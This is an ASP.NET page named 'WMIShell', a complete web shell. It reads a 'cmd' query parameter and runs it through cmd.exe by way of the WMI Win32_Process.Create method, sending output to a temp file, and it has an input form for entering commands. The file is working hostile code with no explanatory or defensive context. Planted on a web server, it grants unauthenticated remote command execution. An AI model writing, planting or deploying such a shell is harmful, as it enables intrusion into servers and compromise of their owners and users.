<%@ Page Language="C#" %>
<%@ Import Namespace="System.Management" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ManagementClass wmi = new ManagementClass("Win32_Process");
            ManagementBaseObject methodArgs = wmi.GetMethodParameters("Create");
            methodArgs["CommandLine"] = "cmd.exe /c " + cmd + " > C:\temp\wmi_out.txt";
            ManagementBaseObject result = wmi.InvokeMethod("Create", methodArgs, null);
            Response.Write("WMI process created, exit code: " + result["returnValue"]);
        }
    }
</script>
<html><body><h2>WMIShell</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
